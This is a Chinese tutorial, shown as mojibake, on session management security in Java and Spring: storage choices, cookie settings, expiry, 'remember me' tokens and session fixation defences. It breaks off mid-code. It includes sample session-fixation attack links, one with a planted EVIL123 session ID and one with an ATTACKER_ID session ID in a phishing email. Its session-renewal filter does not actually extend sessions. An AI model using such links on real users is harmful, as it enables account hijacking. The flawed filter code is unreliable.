---
title: 1ã€Sessionä¼šè¯ç®¡ç†å®‰å…¨æœºåˆ¶
---
## ğŸ“š ç›®å½•

1. [Sessionæœºåˆ¶æ·±åº¦è§£æ](#1-sessionæœºåˆ¶æ·±åº¦è§£æ)
2. [Sessionå­˜å‚¨æ–¹å¼å¯¹æ¯”](#2-sessionå­˜å‚¨æ–¹å¼å¯¹æ¯”)
3. [Sessionå®‰å…¨é…ç½®](#3-sessionå®‰å…¨é…ç½®)
4. [ç™»å½•çŠ¶æ€ç»´æŒç­–ç•¥](#4-ç™»å½•çŠ¶æ€ç»´æŒç­–ç•¥)
5. [ä¼šè¯å›ºå®šæ”»å‡»é˜²æŠ¤](#5-ä¼šè¯å›ºå®šæ”»å‡»é˜²æŠ¤)
6. [ä¼šè¯åŠ«æŒæ”»å‡»é˜²æŠ¤](#6-ä¼šè¯åŠ«æŒæ”»å‡»é˜²æŠ¤)
7. [Cookieä¼šè¯ä¼ è¾“å®‰å…¨](#7-cookieä¼šè¯ä¼ è¾“å®‰å…¨)
8. [å¤šç«¯ä¼šè¯ç®¡ç†](#8-å¤šç«¯ä¼šè¯ç®¡ç†)
9. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#9-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ” Sessionæœºåˆ¶æ·±åº¦è§£æ


### 1.1 ä»€ä¹ˆæ˜¯Session


**ğŸ”¸ Sessionçš„æœ¬è´¨**
Sessionå°±åƒæ˜¯**æœåŠ¡å™¨ç»™æ¯ä¸ªè®¿å®¢å‘çš„ä¸´æ—¶èº«ä»½è¯**ã€‚ä½ æ¥åˆ°ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘ç«™ï¼Œç™»å½•æˆåŠŸåï¼ŒæœåŠ¡å™¨å°±ç»™ä½ åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„"èº«ä»½è¯å·"ï¼Œä¹‹åä½ çš„æ¯æ¬¡è®¿é—®éƒ½å¸¦ç€è¿™ä¸ªå·ç ï¼ŒæœåŠ¡å™¨å°±çŸ¥é“ä½ æ˜¯è°äº†ã€‚

```
ç®€å•ç†è§£ï¼š
ç”¨æˆ·ç™»å½• â†’ æœåŠ¡å™¨ç”ŸæˆSession ID â†’ ç”¨æˆ·ä¿å­˜Session ID â†’ åç»­è¯·æ±‚æºå¸¦ID â†’ æœåŠ¡å™¨è¯†åˆ«ç”¨æˆ·èº«ä»½

å°±åƒå»é“¶è¡ŒåŠäº‹ï¼š
1. å–å·æœºç»™ä½ ä¸€ä¸ªæ’é˜Ÿå·ç 
2. ä½ æ‹¿ç€å·ç ç­‰å¾…
3. å«åˆ°ä½ çš„å·ç æ—¶ï¼Œå·¥ä½œäººå‘˜çŸ¥é“æ˜¯ä½ 
4. åŠå®Œäº‹ï¼Œå·ç å°±å¤±æ•ˆäº†
```

### 1.2 Sessionå®Œæ•´å·¥ä½œæµç¨‹


**ğŸ“‹ Sessionç”Ÿå‘½å‘¨æœŸè¯¦è§£**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â‘ ç™»å½•è¯·æ±‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ç”¨æˆ·      â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ â”‚   æœåŠ¡å™¨     â”‚
â”‚  (æµè§ˆå™¨)    â”‚                 â”‚             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â‘¡éªŒè¯æˆåŠŸ     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚             â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚  ç”ŸæˆSession â”‚
â”‚             â”‚   è¿”å›SessionID  â”‚     ID      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                 â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ä¿å­˜Cookie  â”‚    â‘¢åç»­è¯·æ±‚     â”‚ æŸ¥æ‰¾Session â”‚
â”‚SessionID=ABCâ”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ â”‚ å­˜å‚¨ä¸­çš„æ•°æ® â”‚
â”‚             â”‚   æºå¸¦SessionID  â”‚             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ğŸ”„ è¯¦ç»†æ­¥éª¤è¯´æ˜**

**æ­¥éª¤1ï¼šSessionåˆ›å»º**
```java
// ç”¨æˆ·ç™»å½•æˆåŠŸåï¼ŒæœåŠ¡å™¨åˆ›å»ºSession
@PostMapping("/login")
public String login(String username, String password, HttpSession session) {
    if (validateUser(username, password)) {
        // åˆ›å»ºSessionå¹¶å­˜å‚¨ç”¨æˆ·ä¿¡æ¯
        session.setAttribute("userId", getUserId(username));
        session.setAttribute("username", username);
        session.setAttribute("loginTime", new Date());
        return "ç™»å½•æˆåŠŸ";
    }
    return "ç™»å½•å¤±è´¥";
}
```

**æ­¥éª¤2ï¼šSession IDç”Ÿæˆè§„åˆ™**
```
Session IDç”Ÿæˆè¦æ±‚ï¼š
âœ… è¶³å¤Ÿéšæœºï¼šé˜²æ­¢è¢«çŒœæµ‹
âœ… è¶³å¤Ÿé•¿åº¦ï¼šé€šå¸¸128ä½ä»¥ä¸Š
âœ… å”¯ä¸€æ€§ï¼šå…¨å±€ä¸é‡å¤
âœ… ä¸å¯é¢„æµ‹ï¼šä¸èƒ½é€šè¿‡è§„å¾‹æ¨ç®—

ç¤ºä¾‹Session IDï¼š
JSESSIONID=B8F2A9C7E3D1F4A6B9E2C5D8F1A4B7E3C6D9F2A5B8E1C4D7F0A3B6E9C2D5F8A1
```

**æ­¥éª¤3ï¼šSessionå­˜å‚¨ç»“æ„**
```
æœåŠ¡å™¨å†…å­˜ä¸­çš„Sessionå­˜å‚¨ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SessionID: ABC123...                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ åˆ›å»ºæ—¶é—´: 2024-08-09 10:30:00       â”‚
â”‚ æœ€åè®¿é—®: 2024-08-09 10:45:00       â”‚
â”‚ è¿‡æœŸæ—¶é—´: 2024-08-09 11:30:00       â”‚
â”‚ ç”¨æˆ·æ•°æ®: {                         â”‚
â”‚   userId: 1001                      â”‚
â”‚   username: "å¼ ä¸‰"                  â”‚
â”‚   role: "admin"                     â”‚
â”‚   permissions: ["read", "write"]    â”‚
â”‚ }                                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**æ­¥éª¤4ï¼šSessioné”€æ¯æ—¶æœº**
```
Sessionè‡ªåŠ¨é”€æ¯æ¡ä»¶ï¼š
ğŸ• è¶…æ—¶é”€æ¯ï¼š30åˆ†é’Ÿæ— æ´»åŠ¨è‡ªåŠ¨æ¸…é™¤
ğŸšª ä¸»åŠ¨æ³¨é”€ï¼šç”¨æˆ·ç‚¹å‡»é€€å‡ºç™»å½•
ğŸ”„ Sessionå¤±æ•ˆï¼šæœåŠ¡å™¨é‡å¯æˆ–æ¸…ç†
âš ï¸ å¼‚å¸¸æƒ…å†µï¼šç³»ç»Ÿå¼‚å¸¸å¯¼è‡´æ¸…ç†

Sessionæ¸…ç†ç¤ºä¾‹ï¼š
// ç”¨æˆ·ä¸»åŠ¨é€€å‡º
@PostMapping("/logout")
public String logout(HttpSession session) {
    session.invalidate(); // ç«‹å³é”€æ¯Session
    return "é€€å‡ºæˆåŠŸ";
}
```

### 1.3 Sessionä¸Cookieçš„å…³ç³»


**ğŸ¤ Sessionå’ŒCookieçš„é…åˆ**
```
ç†è§£è¦ç‚¹ï¼š
Sessionæ•°æ®å­˜åœ¨æœåŠ¡å™¨ â†â†’ Session IDå­˜åœ¨å®¢æˆ·ç«¯Cookie

å…·ä½“è¿‡ç¨‹ï¼š
1. æœåŠ¡å™¨ç”ŸæˆSessionæ•°æ®ï¼ˆå­˜æœåŠ¡å™¨å†…å­˜/Redisï¼‰
2. æœåŠ¡å™¨ç”ŸæˆSession ID
3. Session IDé€šè¿‡Cookieå‘é€ç»™æµè§ˆå™¨
4. æµè§ˆå™¨ä¿å­˜Session IDåˆ°Cookie
5. åç»­è¯·æ±‚è‡ªåŠ¨æºå¸¦Cookieä¸­çš„Session ID
6. æœåŠ¡å™¨æ ¹æ®Session IDæ‰¾åˆ°å¯¹åº”çš„Sessionæ•°æ®
```

**ğŸ“Š Sessionä¸Cookieå¯¹æ¯”**
| ç‰¹æ€§ | Session | Cookie |
|------|---------|---------|
| **å­˜å‚¨ä½ç½®** | æœåŠ¡å™¨ç«¯ | å®¢æˆ·ç«¯æµè§ˆå™¨ |
| **å­˜å‚¨å®¹é‡** | ç†è®ºæ— é™åˆ¶ | 4KBé™åˆ¶ |
| **å®‰å…¨æ€§** | è¾ƒé«˜ï¼ˆæœåŠ¡å™¨æ§åˆ¶ï¼‰ | è¾ƒä½ï¼ˆå®¢æˆ·ç«¯å¯è§ï¼‰ |
| **ç”Ÿå‘½å‘¨æœŸ** | ä¼šè¯ç»“æŸæˆ–è¶…æ—¶ | å¯è®¾ç½®è¿‡æœŸæ—¶é—´ |
| **ç½‘ç»œä¼ è¾“** | åªä¼ è¾“Session ID | æ¯æ¬¡è¯·æ±‚éƒ½ä¼ è¾“ |
| **æœåŠ¡å™¨è´Ÿæ‹…** | å ç”¨æœåŠ¡å™¨å†…å­˜ | æ— æœåŠ¡å™¨è´Ÿæ‹… |

---

## 2. ğŸ’¾ Sessionå­˜å‚¨æ–¹å¼å¯¹æ¯”


### 2.1 å†…å­˜å­˜å‚¨æ–¹å¼


**ğŸ§  å†…å­˜å­˜å‚¨ç‰¹ç‚¹**
```java
// é»˜è®¤çš„å†…å­˜å­˜å‚¨
@Configuration
public class SessionConfig {
    @Bean
    public HttpSessionListener sessionListener() {
        return new HttpSessionListener() {
            @Override
            public void sessionCreated(HttpSessionEvent se) {
                System.out.println("Sessionåˆ›å»º: " + se.getSession().getId());
            }
        };
    }
}
```

**âœ… å†…å­˜å­˜å‚¨ä¼˜åŠ¿**
- ğŸš€ **è®¿é—®é€Ÿåº¦å¿«**ï¼šç›´æ¥å†…å­˜è¯»å†™ï¼Œæ¯«ç§’çº§å“åº”
- ğŸ”§ **é…ç½®ç®€å•**ï¼šæ¡†æ¶é»˜è®¤æ”¯æŒï¼Œæ— éœ€é¢å¤–é…ç½®
- ğŸ’° **æˆæœ¬ä½å»‰**ï¼šä¸éœ€è¦å¤–éƒ¨å­˜å‚¨æœåŠ¡

**âŒ å†…å­˜å­˜å‚¨åŠ£åŠ¿**
- ğŸ”„ **æ— æ³•é›†ç¾¤**ï¼šå¤šå°æœåŠ¡å™¨æ— æ³•å…±äº«Session
- âš¡ **æœåŠ¡é‡å¯ä¸¢å¤±**ï¼šé‡å¯åæ‰€æœ‰ç”¨æˆ·éœ€è¦é‡æ–°ç™»å½•
- ğŸ“ˆ **å†…å­˜å‹åŠ›**ï¼šç”¨æˆ·é‡å¤§æ—¶å ç”¨å¤§é‡å†…å­˜

### 2.2 Redisç¼“å­˜å­˜å‚¨


**âš¡ Rediså­˜å‚¨é…ç½®**
```java
// Spring Session Redisé…ç½®
@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 1800)
@Configuration
public class RedisSessionConfig {
    
    @Bean
    public RedisConnectionFactory connectionFactory() {
        return new LettuceConnectionFactory("localhost", 6379);
    }
}
```

**âœ… Rediså­˜å‚¨ä¼˜åŠ¿**
- ğŸŒ **æ”¯æŒé›†ç¾¤**ï¼šå¤šå°æœåŠ¡å™¨å…±äº«Sessionæ•°æ®
- ğŸ”„ **æœåŠ¡é‡å¯ä¿æŒ**ï¼šé‡å¯åSessionä¾ç„¶æœ‰æ•ˆ
- âš¡ **é«˜æ€§èƒ½**ï¼šå†…å­˜çº§åˆ«çš„è¯»å†™é€Ÿåº¦
- ğŸ“Š **æ•°æ®æŒä¹…åŒ–**ï¼šå¯é€‰æ‹©æŒä¹…åŒ–åˆ°ç£ç›˜

**âŒ Rediså­˜å‚¨åŠ£åŠ¿**
- ğŸ› ï¸ **é…ç½®å¤æ‚**ï¼šéœ€è¦éƒ¨ç½²å’Œç»´æŠ¤RedisæœåŠ¡
- ğŸ’° **é¢å¤–æˆæœ¬**ï¼šéœ€è¦RedisæœåŠ¡å™¨èµ„æº
- ğŸŒ **ç½‘ç»œä¾èµ–**ï¼šç½‘ç»œå»¶è¿Ÿå½±å“æ€§èƒ½

### 2.3 æ•°æ®åº“å­˜å‚¨


**ğŸ—„ï¸ æ•°æ®åº“å­˜å‚¨å®ç°**
```sql
-- Sessionè¡¨ç»“æ„
CREATE TABLE sessions (
    session_id VARCHAR(128) PRIMARY KEY,
    session_data TEXT,
    created_time TIMESTAMP,
    last_access_time TIMESTAMP,
    expire_time TIMESTAMP
);
```

```java
// æ•°æ®åº“Sessioné…ç½®
@EnableJdbcHttpSession(tableName = "sessions", maxInactiveIntervalInSeconds = 1800)
@Configuration
public class JdbcSessionConfig {
    // Spring Bootä¼šè‡ªåŠ¨åˆ›å»ºè¡¨ç»“æ„
}
```

**âœ… æ•°æ®åº“å­˜å‚¨ä¼˜åŠ¿**
- ğŸ’¾ **æ•°æ®å¯é **ï¼šæŒä¹…åŒ–å­˜å‚¨ï¼Œä¸ä¼šä¸¢å¤±
- ğŸ“Š **å®¡è®¡å‹å¥½**ï¼šå¯ä»¥æŸ¥è¯¢Sessionå†å²è®°å½•
- ğŸ”„ **æ”¯æŒé›†ç¾¤**ï¼šå¤šå°æœåŠ¡å™¨å…±äº«æ•°æ®

**âŒ æ•°æ®åº“å­˜å‚¨åŠ£åŠ¿**
- ğŸŒ **æ€§èƒ½è¾ƒæ…¢**ï¼šç£ç›˜IOæ¯”å†…å­˜æ…¢å¾ˆå¤š
- ğŸ“ˆ **æ•°æ®åº“å‹åŠ›**ï¼šé¢‘ç¹è¯»å†™å½±å“æ•°æ®åº“æ€§èƒ½
- ğŸ§¹ **æ¸…ç†å¤æ‚**ï¼šéœ€è¦å®šæœŸæ¸…ç†è¿‡æœŸSession

### 2.4 å­˜å‚¨æ–¹å¼é€‰æ‹©å»ºè®®


```
ğŸ¯ é€‰æ‹©æŒ‡å¯¼åŸåˆ™ï¼š

å•æœºåº”ç”¨ï¼ˆç”¨æˆ·<1000ï¼‰ï¼š
â””â”€ å†…å­˜å­˜å‚¨ âœ…
   â””â”€ ç®€å•å¿«é€Ÿï¼Œæˆæœ¬æœ€ä½

å°å‹é›†ç¾¤ï¼ˆç”¨æˆ·<1ä¸‡ï¼‰ï¼š
â””â”€ Rediså­˜å‚¨ âœ…
   â””â”€ æ€§èƒ½å¥½ï¼Œæ”¯æŒé›†ç¾¤

å¤§å‹åº”ç”¨ï¼ˆç”¨æˆ·>1ä¸‡ï¼‰ï¼š
â””â”€ Rediså­˜å‚¨ + æ•°æ®åº“å¤‡ä»½ âœ…
   â””â”€ Redisä¸»å­˜å‚¨ï¼Œæ•°æ®åº“åšå®¡è®¡

é«˜å¯ç”¨è¦æ±‚ï¼š
â””â”€ Redisé›†ç¾¤ + æ•°æ®åº“æŒä¹…åŒ– âœ…
   â””â”€ åŒé‡ä¿éšœï¼Œæ•°æ®ä¸ä¸¢å¤±
```

---

## 3. ğŸ”’ Sessionå®‰å…¨é…ç½®


### 3.1 Session IDéšæœºæ€§é…ç½®


**ğŸ² é«˜å¼ºåº¦Session IDç”Ÿæˆ**
```java
@Configuration
public class SessionSecurityConfig {
    
    @Bean
    public DefaultCookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        
        // è®¾ç½®Cookieåç§°ï¼ˆéšè—æŠ€æœ¯æ ˆä¿¡æ¯ï¼‰
        serializer.setCookieName("SESSIONTOKEN");
        
        // å¼ºåˆ¶ä½¿ç”¨å®‰å…¨Cookie
        serializer.setUseSecureCookie(true);
        serializer.setUseHttpOnlyCookie(true);
        
        // è®¾ç½®SameSiteé˜²æ­¢CSRF
        serializer.setSameSite("Strict");
        
        return serializer;
    }
}
```

**ğŸ” Session IDå®‰å…¨è¦æ±‚**
```
Session IDç”Ÿæˆæ ‡å‡†ï¼š
âœ… é•¿åº¦è¦æ±‚ï¼šè‡³å°‘128ä½ï¼ˆ32ä¸ªå­—ç¬¦ï¼‰
âœ… å­—ç¬¦é›†ï¼šä½¿ç”¨å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šå­—ç¬¦
âœ… éšæœºæ€§ï¼šä½¿ç”¨åŠ å¯†å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨
âœ… å”¯ä¸€æ€§ï¼šå…¨å±€å”¯ä¸€ï¼Œä¸èƒ½é‡å¤

ç¤ºä¾‹å¯¹æ¯”ï¼š
âŒ å¼±Session IDï¼šUSER123_20240809_001
âœ… å¼ºSession IDï¼šA7F3E9B2D8C1F4A6E3B9D2C5F8A1B4E7
```

### 3.2 Sessionè¿‡æœŸç­–ç•¥é…ç½®


**â° çµæ´»çš„è¿‡æœŸç­–ç•¥**
```java
@Component
public class SessionTimeoutManager {
    
    // ä¸åŒç”¨æˆ·ç±»å‹çš„è¶…æ—¶æ—¶é—´
    private static final Map<String, Integer> TIMEOUT_CONFIG = Map.of(
        "ADMIN", 3600,      // ç®¡ç†å‘˜1å°æ—¶
        "VIP", 7200,        // VIPç”¨æˆ·2å°æ—¶  
        "NORMAL", 1800      // æ™®é€šç”¨æˆ·30åˆ†é’Ÿ
    );
    
    @EventListener
    public void handleSessionCreated(HttpSessionEvent event) {
        HttpSession session = event.getSession();
        String userType = getUserType(session);
        
        // æ ¹æ®ç”¨æˆ·ç±»å‹è®¾ç½®ä¸åŒçš„è¶…æ—¶æ—¶é—´
        int timeout = TIMEOUT_CONFIG.getOrDefault(userType, 1800);
        session.setMaxInactiveInterval(timeout);
    }
}
```

**ğŸ“Š è¿‡æœŸç­–ç•¥ç±»å‹**
```
è¿‡æœŸç­–ç•¥å¯¹æ¯”ï¼š

å›ºå®šè¿‡æœŸï¼š
â””â”€ ç‰¹ç‚¹ï¼šç™»å½•åå›ºå®šæ—¶é—´è¿‡æœŸ
â””â”€ é€‚ç”¨ï¼šé«˜å®‰å…¨è¦æ±‚åœºæ™¯
â””â”€ ç¤ºä¾‹ï¼šé“¶è¡Œç³»ç»Ÿ30åˆ†é’Ÿå¿…é¡»é‡æ–°ç™»å½•

æ»‘åŠ¨è¿‡æœŸï¼š
â””â”€ ç‰¹ç‚¹ï¼šæ¯æ¬¡æ´»åŠ¨é‡æ–°è®¡ç®—è¿‡æœŸæ—¶é—´
â””â”€ é€‚ç”¨ï¼šä¸€èˆ¬Webåº”ç”¨
â””â”€ ç¤ºä¾‹ï¼šè´­ç‰©ç½‘ç«™ï¼Œæµè§ˆå•†å“ä¼šå»¶é•¿ç™»å½•æ—¶é—´

æ°¸ä¸è¿‡æœŸï¼š
â””â”€ ç‰¹ç‚¹ï¼šé™¤éä¸»åŠ¨é€€å‡ºå¦åˆ™æ°¸ä¹…æœ‰æ•ˆ
â””â”€ é€‚ç”¨ï¼šå†…éƒ¨ç³»ç»Ÿæˆ–æœ¬åœ°åº”ç”¨
â””â”€ é£é™©ï¼šå®‰å…¨æ€§æœ€ä½ï¼Œä¸æ¨è
```

### 3.3 Sessionè‡ªåŠ¨å»¶æœŸæœºåˆ¶


**ğŸ”„ æ™ºèƒ½ç»­æœŸç­–ç•¥**
```java
@Component
public class SessionRenewalFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpSession session = httpRequest.getSession(false);
        
        if (session != null) {
            // æ£€æŸ¥Sessionæ˜¯å¦å³å°†è¿‡æœŸï¼ˆå‰©ä½™æ—¶é—´<5åˆ†é’Ÿï¼‰
            int remainingTime = session.getMaxInactiveInterval();
            long lastAccessed = session.getLastAccessedTime();
            long now = System.currentTimeMillis();
            
            if ((now - lastAccessed) > (remainingTime - 300) * 1000) {
                // è‡ªåŠ¨å»¶æœŸï¼ˆé‡ç½®è¶…æ—¶æ—¶é—´ï¼‰
                session.setMaxInactiveInterval(session.getMaxInactiveInterval());
                
                // è®°å½•ç»­æœŸæ—¥å¿—
                logger.info("Sessionè‡ªåŠ¨ç»­æœŸ: {}", session.getId());
            }
        }
        
        chain.doFilter(request, response);
    }
}
```

---

## 4. ğŸ” ç™»å½•çŠ¶æ€ç»´æŒç­–ç•¥


### 4.1 SessionæŒä¹…åŒ–æœºåˆ¶


**ğŸ’¾ é•¿æœŸç™»å½•çŠ¶æ€ä¿æŒ**
```java
@Service
public class RememberMeService {
    
    // ç”Ÿæˆ"è®°ä½æˆ‘"ä»¤ç‰Œ
    public String generateRememberToken(String username) {
        // ç”Ÿæˆé•¿æœŸæœ‰æ•ˆçš„ä»¤ç‰Œï¼ˆæ¯”å¦‚30å¤©ï¼‰
        String token = generateSecureToken();
        
        // å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œå…³è”ç”¨æˆ·
        RememberToken rememberToken = new RememberToken();
        rememberToken.setToken(token);
        rememberToken.setUsername(username);
        rememberToken.setExpireTime(LocalDateTime.now().plusDays(30));
        
        tokenRepository.save(rememberToken);
        return token;
    }
    
    // é€šè¿‡ä»¤ç‰Œè‡ªåŠ¨ç™»å½•
    public boolean autoLogin(String token, HttpSession session) {
        RememberToken rememberToken = tokenRepository.findByToken(token);
        
        if (rememberToken != null && !rememberToken.isExpired()) {
            // è‡ªåŠ¨åˆ›å»ºSession
            session.setAttribute("userId", rememberToken.getUserId());
            session.setAttribute("username", rememberToken.getUsername());
            session.setAttribute("autoLogin", true);
            
            return true;
        }
        return false;
    }
}
```

**ğŸ”„ è®°ä½æˆ‘åŠŸèƒ½æµç¨‹**
```
è®°ä½æˆ‘åŠŸèƒ½å®Œæ•´æµç¨‹ï¼š

ç”¨æˆ·å‹¾é€‰"è®°ä½æˆ‘" â†’ ç™»å½•æˆåŠŸåç”Ÿæˆé•¿æœŸä»¤ç‰Œ â†’ ä»¤ç‰Œå­˜å‚¨åˆ°Cookie â†’ 
Sessionè¿‡æœŸå â†’ æ£€æŸ¥Cookieä¸­çš„ä»¤ç‰Œ â†’ ä»¤ç‰Œæœ‰æ•ˆåˆ™è‡ªåŠ¨ç™»å½• â†’ åˆ›å»ºæ–°Session

å®‰å…¨è€ƒè™‘ï¼š
âœ… ä»¤ç‰Œå®šæœŸæ›´æ¢
âœ… ä»¤ç‰ŒåŠ å¯†å­˜å‚¨
âœ… æ£€æµ‹å¼‚å¸¸ä½¿ç”¨
âœ… æ”¯æŒä¸€é”®æ¸…é™¤æ‰€æœ‰è®¾å¤‡
```

### 4.2 è®°ä½æˆ‘åŠŸèƒ½å®‰å…¨é£é™©


**âš ï¸ å®‰å…¨é£é™©åˆ†æ**
```
è®°ä½æˆ‘åŠŸèƒ½çš„å®‰å…¨é£é™©ï¼š

è®¾å¤‡ä¸¢å¤±é£é™©ï¼š
â””â”€ é—®é¢˜ï¼šæ‰‹æœº/ç”µè„‘ä¸¢å¤±ï¼Œä»–äººå¯ç›´æ¥è®¿é—®
â””â”€ é˜²æŠ¤ï¼šè®¾å¤‡ç»‘å®šã€å¼‚åœ°ç™»å½•æ£€æµ‹

ä»¤ç‰Œæ³„éœ²é£é™©ï¼š
â””â”€ é—®é¢˜ï¼šCookieè¢«çªƒå–ï¼Œæ”»å‡»è€…è·å¾—è®¿é—®æƒé™
â””â”€ é˜²æŠ¤ï¼šä»¤ç‰ŒåŠ å¯†ã€å®šæœŸæ›´æ¢ã€HTTPSä¼ è¾“

é•¿æœŸæœ‰æ•ˆé£é™©ï¼š
â””â”€ é—®é¢˜ï¼šä»¤ç‰Œé•¿æœŸæœ‰æ•ˆï¼Œå¢åŠ è¢«åˆ©ç”¨é£é™©
â””â”€ é˜²æŠ¤ï¼šåˆç†è®¾ç½®è¿‡æœŸæ—¶é—´ã€ç›‘æ§å¼‚å¸¸è®¿é—®
```

**ğŸ›¡ï¸ å®‰å…¨åŠ å¼ºæªæ–½**
```java
@Service
public class SecureRememberMeService {
    
    // åŠ å¼ºç‰ˆä»¤ç‰Œç”Ÿæˆ
    public String generateSecureToken(String username, String deviceInfo) {
        // åŒ…å«è®¾å¤‡æŒ‡çº¹çš„ä»¤ç‰Œ
        String payload = username + ":" + deviceInfo + ":" + System.currentTimeMillis();
        
        // AESåŠ å¯†ä»¤ç‰Œ
        String encryptedToken = AESUtil.encrypt(payload, secretKey);
        
        // å­˜å‚¨æ—¶ç»‘å®šè®¾å¤‡ä¿¡æ¯
        saveTokenWithDevice(encryptedToken, username, deviceInfo);
        
        return encryptedToken;
    }
    
    // éªŒè¯æ—¶æ£€æŸ¥è®¾å¤‡
    public boolean validateToken(String token, String currentDeviceInfo) {
        try {
            String decrypted = AESUtil.decrypt(token, secretKey);
            String[] parts = decrypted.split(":");
            
            String username = parts[0];
            String originalDevice = parts[1];
            
            // æ£€æŸ¥è®¾å¤‡æ˜¯å¦åŒ¹é…
            if (!originalDevice.equals(currentDeviceInfo)) {
                logger.warn("è®¾å¤‡ä¸åŒ¹é…ï¼Œå¯èƒ½å­˜åœ¨å®‰å…¨é£é™©: {}", username);
                return false;
            }
            
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
```

---

## 5. ğŸ›¡ï¸ ä¼šè¯å›ºå®šæ”»å‡»é˜²æŠ¤


### 5.1 ä¼šè¯å›ºå®šæ”»å‡»åŸç†è¯¦è§£


**ğŸ¯ ä»€ä¹ˆæ˜¯ä¼šè¯å›ºå®šæ”»å‡»**
ä¼šè¯å›ºå®šæ”»å‡»å°±åƒæ˜¯**æœ‰äººæå‰åœ¨ä½ çš„åº§ä½ä¸Šæ”¾äº†ä¸€ä¸ªå‡çš„å·ç ç‰Œ**ã€‚æ”»å‡»è€…å…ˆè·å–ä¸€ä¸ªSession IDï¼Œç„¶åæƒ³åŠæ³•è®©ä½ ç”¨è¿™ä¸ªIDç™»å½•ï¼Œè¿™æ ·æ”»å‡»è€…å°±èƒ½å†’å……ä½ çš„èº«ä»½ã€‚

**ğŸ“‹ æ”»å‡»è¿‡ç¨‹å›¾è§£**
```
ä¼šè¯å›ºå®šæ”»å‡»æ­¥éª¤ï¼š

â‘ æ”»å‡»è€…è®¿é—®ç½‘ç«™ â†’ â‘¡æœåŠ¡å™¨åˆ†é…SessionID=ABC â†’ â‘¢æ”»å‡»è€…è·å¾—SessionID
                                     â†“
â‘£æ”»å‡»è€…è¯±å¯¼å—å®³è€… â†’ â‘¤å—å®³è€…ç”¨SessionID=ABCç™»å½• â†’ â‘¥æ”»å‡»è€…ç”¨åŒä¸€SessionIDè®¿é—®
ä½¿ç”¨SessionID=ABC                                  â†“
                                            â‘¦æ”»å‡»è€…è·å¾—å—å®³è€…æƒé™

å…·ä½“ç¤ºä¾‹ï¼š
æ”»å‡»è€…å‘é€é“¾æ¥ï¼šhttp://bank.com?JSESSIONID=EVIL123
å—å®³è€…ç‚¹å‡»é“¾æ¥å¹¶ç™»å½• â†’ æ”»å‡»è€…ä½¿ç”¨EVIL123è®¿é—®é“¶è¡Œè´¦æˆ·
```

**ğŸ” æ”»å‡»åœºæ™¯å®ä¾‹**
```
çœŸå®æ”»å‡»åœºæ™¯ï¼š

é‚®ä»¶è¯±å¯¼ï¼š
"äº²çˆ±çš„ç”¨æˆ·ï¼Œè¯·ç‚¹å‡»é“¾æ¥æŸ¥çœ‹è´¦å•ï¼š
 http://bank.com/login?sessionid=ATTACKER_ID"

QRç æ”»å‡»ï¼š
æ”»å‡»è€…åœ¨å…¬å…±åœºæ‰€è´´å¸¦æœ‰æ¶æ„Session IDçš„QRç 

é’“é±¼ç½‘ç«™ï¼š
æ¨¡ä»¿çœŸå®ç½‘ç«™ï¼Œè¯±å¯¼ç”¨æˆ·ä½¿ç”¨é¢„è®¾çš„Session ID
```

### 5.2 ä¼šè¯å›ºå®šæ”»å‡»é˜²æŠ¤ç­–ç•¥


**ğŸ”„ Session IDé‡æ–°ç”Ÿæˆ**
```java
@Controller
public class SecureLoginController {
    
    @PostMapping("/login")
    public String login(String username, String password, 
                       HttpServletRequest request) {
        
        // éªŒè¯ç”¨æˆ·åå¯†ç 
        if (authService.validate(username, password)) {
            
            // å…³é”®é˜²æŠ¤ï¼šç™»å½•æˆåŠŸåç«‹å³æ›´æ¢Session ID
            HttpSession oldSession = request.getSession(false);
            if (oldSession != null) {
                oldSession.invalidate(); // é”€æ¯æ—§Session
            }
            
            // åˆ›å»ºæ–°çš„Session
            HttpSession newSession = request.getSession(true);
            newSession.setAttribute("userId", getUserId(username));
            newSession.setAttribute("username", username);
            
